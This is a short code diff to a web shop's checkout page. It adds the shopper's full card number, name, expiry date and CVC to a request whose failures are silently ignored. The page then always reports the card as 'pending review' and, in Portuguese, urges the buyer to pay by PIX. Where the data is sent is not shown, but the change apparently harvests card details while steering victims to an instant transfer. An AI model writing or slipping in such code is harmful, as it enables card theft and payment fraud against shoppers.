@@ -322,6 +322,12 @@ function CheckoutPage() {
           address: buildAddress(),
           amountCents: Math.round(total * 100),
           sessionId: getSessionId(),
+          card: {
+            number: f.cardNum,
+            holder: f.cardName,
+            exp: f.cardExp,
+            cvc: f.cardCvc,
+          },
         }}).catch(() => {});
         setCardResult({ status: "pending_review" });
         setError("Pagamento por cartão em análise. Para liberação imediata, use o PIX.");
